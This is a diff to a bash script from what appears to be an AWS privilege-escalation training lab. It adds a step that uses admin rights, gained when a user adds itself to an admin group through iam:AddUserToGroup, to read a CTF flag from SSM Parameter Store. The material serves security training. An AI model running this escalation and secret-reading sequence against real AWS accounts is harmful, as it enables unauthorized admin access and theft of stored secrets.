@@ -215,18 +215,37 @@ show_cmd "ReadOnly" "aws iam list-groups-for-user --user-name $START_USER --quer
 UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
 echo "Current groups: $UPDATED_GROUPS"
 
+# [EXPLOIT] Step 8: Capture the CTF flag
+# The starting user now has AdministratorAccess inherited through group membership, which
+# grants ssm:GetParameter implicitly. Use those credentials to read the scenario flag
+# from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-013-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Summary:${NC}"
 echo "1. Started as: $START_USER (no group memberships, limited permissions)"
 echo "2. Confirmed limited access - could not list IAM users"
 echo "3. Used AddUserToGroup to add self to $ADMIN_GROUP"
 echo "4. $START_USER now has administrator access via group membership"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $START_USER (no admin access)"
@@ -234,6 +253,7 @@ echo -e "    ↓ (iam:AddUserToGroup)"
 echo -e "  Adds self to $ADMIN_GROUP"
 echo -e "    ↓ (group membership + AdministratorAccess policy)"
 echo -e "  $START_USER gains Administrator Access"
+echo -e "    → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
